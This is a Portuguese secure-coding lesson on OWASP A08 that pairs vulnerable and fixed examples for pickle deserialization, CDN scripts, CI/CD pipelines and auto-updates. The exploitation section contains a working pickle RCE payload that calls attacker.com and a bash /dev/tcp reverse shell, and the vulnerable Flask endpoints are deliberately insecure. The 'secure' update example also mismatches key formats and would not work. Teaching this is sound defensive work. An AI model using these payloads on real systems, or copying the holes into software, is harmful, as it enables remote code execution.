# 📦 A08 - Falhas de Integridade de Software e Dados

## 📖 Teoria (20%)

Ocorre quando código ou infraestrutura não protege contra **modificações não autorizadas**. Inclui atualizações sem verificação de integridade, pipelines CI/CD inseguros e dados de fontes não confiáveis.

---

## 💻 Prática (80%)

### 🔴 Vulnerável — Deserialização insegura

```python
import pickle
from flask import request

@app.route("/load-session", methods=["POST"])
def load_session():
    # ❌ Deserializar dados do usuário diretamente!
    data = request.get_data()
    user_data = pickle.loads(data)  # RCE garantido!
    return jsonify(user_data)
```

**Exploração:**
```python
import pickle, os, base64, requests

class Exploit(object):
    def __reduce__(self):
        # Código executado ao deserializar
        return (os.system, ("curl http://attacker.com/pwned",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()

# Enviar payload para o servidor vulnerável
requests.post("http://target.com/load-session", data=base64.b64decode(payload))
# Servidor executa: curl http://attacker.com/pwned
# → Confirmação de RCE!

# Reverse shell via desserialização:
class ReverseShell(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
        return (os.system, (cmd,))
```

### 🟢 Seguro — Serialização segura

```python
import json
import hmac
import hashlib

SECRET = os.environ.get("SIGNING_SECRET")

def serialize_safe(data: dict) -> str:
    # ✅ Use JSON em vez de pickle
    json_data = json.dumps(data, sort_keys=True)
    
    # ✅ Assinar os dados para verificar integridade
    signature = hmac.new(
        SECRET.encode(),
        json_data.encode(),
        hashlib.sha256
    ).hexdigest()
    
    return f"{json_data}:{signature}"

def deserialize_safe(serialized: str) -> dict:
    try:
        json_data, signature = serialized.rsplit(":", 1)
        
        # ✅ Verificar assinatura antes de processar
        expected = hmac.new(
            SECRET.encode(),
            json_data.encode(),
            hashlib.sha256
        ).hexdigest()
        
        if not hmac.compare_digest(signature, expected):
            raise ValueError("Assinatura inválida — dados adulterados!")
        
        return json.loads(json_data)
    except Exception:
        raise ValueError("Dados inválidos")
```

---

### 🔴 Vulnerável — Script externo sem verificação

```html
<!-- ❌ Carrega script sem verificar integridade -->
<script src="https://cdn.external.com/library.js"></script>
<!-- Se o CDN for comprometido → malware em todos os usuários! -->

<!-- Ataque real: Polyfill.io (2024) -->
<!-- cdn.polyfill.io foi comprometido e serviu malware para 100k+ sites -->
```

### 🟢 Seguro — Subresource Integrity (SRI)

```html
<!-- ✅ SRI garante que o arquivo não foi modificado -->
<script 
  src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"
  integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
  crossorigin="anonymous">
</script>

<!-- Gerar hash SRI: -->
<!-- cat library.js | openssl dgst -sha256 -binary | openssl base64 -A -->
<!-- Ou: https://www.srihash.org/ -->
```

```bash
# Gerar hash SRI
curl -s https://cdn.example.com/library.js | \
  openssl dgst -sha256 -binary | \
  openssl base64 -A | \
  awk '{print "sha256-"$0}'
```

---

### 🔴 Vulnerável — Pipeline CI/CD inseguro

```yaml
# .github/workflows/deploy.yml — VULNERÁVEL
name: Deploy
on: [push]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      # ❌ Aceita código de qualquer PR sem review
      - name: Run tests
        run: npm test
        
      # ❌ Deploy automático sem aprovação
      - name: Deploy to Production
        run: |
          curl -X POST https://api.production.com/deploy \
               -H "Authorization: Bearer ${{ secrets.DEPLOY_KEY }}" \
               # Qualquer contribuidor pode alterar este script!
```

### 🟢 Seguro — Pipeline com verificações

```yaml
# .github/workflows/deploy.yml — SEGURO
name: Deploy Seguro
on:
  push:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      
      # ✅ Scan de dependências
      - name: Dependency Check
        run: |
          pip install safety
          safety check
          npm audit --audit-level=high
      
      # ✅ SAST — análise estática de código
      - name: SAST Scan
        uses: github/codeql-action/analyze@v3
        with:
          languages: python, javascript
      
      # ✅ Scan de secrets no código
      - name: Secret Scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: HEAD~1
  
  deploy:
    needs: security-scan
    runs-on: ubuntu-latest
    environment: production  # ✅ Requer aprovação manual!
    steps:
      # ✅ Verificar assinatura de commits
      - name: Verify commit signature
        run: git verify-commit HEAD
      
      - name: Deploy
        run: ./scripts/deploy.sh
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

---

### 🔴 Vulnerável — Auto-update sem verificação

```python
import requests, subprocess

@app.route("/admin/update", methods=["POST"])
def auto_update():
    update_url = request.json["url"]  # ❌ URL controlada pelo atacante!
    
    # Baixar e executar update
    response = requests.get(update_url)
    with open("/tmp/update.sh", "wb") as f:
        f.write(response.content)
    
    subprocess.run(["bash", "/tmp/update.sh"])  # ❌ RCE!
    return "Updated!"
```

### 🟢 Seguro — Verificação de integridade de updates

```python
import hashlib
import requests
import subprocess

TRUSTED_UPDATE_HOST = "https://updates.minhaempresa.com"
UPDATE_PUBLIC_KEY = "ssh-rsa AAAA..."  # Chave pública para verificação

def download_and_verify_update(version: str) -> bool:
    # ✅ Apenas URLs confiáveis
    url = f"{TRUSTED_UPDATE_HOST}/v{version}/update.tar.gz"
    sig_url = f"{TRUSTED_UPDATE_HOST}/v{version}/update.tar.gz.sig"
    
    # Baixar arquivo e assinatura
    update_data = requests.get(url, timeout=30).content
    signature = requests.get(sig_url, timeout=10).content
    
    # ✅ Verificar assinatura criptográfica
    from cryptography.hazmat.primitives.asymmetric import ed25519
    from cryptography.hazmat.primitives import serialization
    
    public_key = serialization.load_pem_public_key(UPDATE_PUBLIC_KEY.encode())
    
    try:
        public_key.verify(signature, update_data)
        # ✅ Assinatura válida — pode instalar
        return True
    except Exception:
        print("ALERTA: Assinatura inválida! Update rejeitado.")
        return False
```

---

### 🛠️ Ferramentas

```bash
# Verificar assinatura de pacotes Python
pip install --require-hashes -r requirements.txt

# Verificar assinaturas NPM
npm audit signatures

# Cosign — assinar imagens de container
cosign sign --key cosign.key minha-imagem:latest
cosign verify --key cosign.pub minha-imagem:latest

# Sigstore — assinatura sem chave (keyless)
cosign sign --identity-token=$(gcloud auth print-identity-token) \
    minha-imagem:latest

# Grype — vulnerabilidades em SBOMs
syft packages dir:. -o spdx-json > sbom.json
grype sbom:sbom.json
```

---

### ✅ Checklist de Prevenção

- [ ] NUNCA usar pickle/eval com dados do usuário
- [ ] SRI em todos os scripts e estilos externos
- [ ] Verificar assinatura de updates antes de aplicar
- [ ] CI/CD com gates de segurança obrigatórios
- [ ] Commits assinados com GPG
- [ ] SBOM gerado e monitorado
- [ ] Revisão de código obrigatória antes de merge
- [ ] Ambientes de produção com aprovação manual de deploy
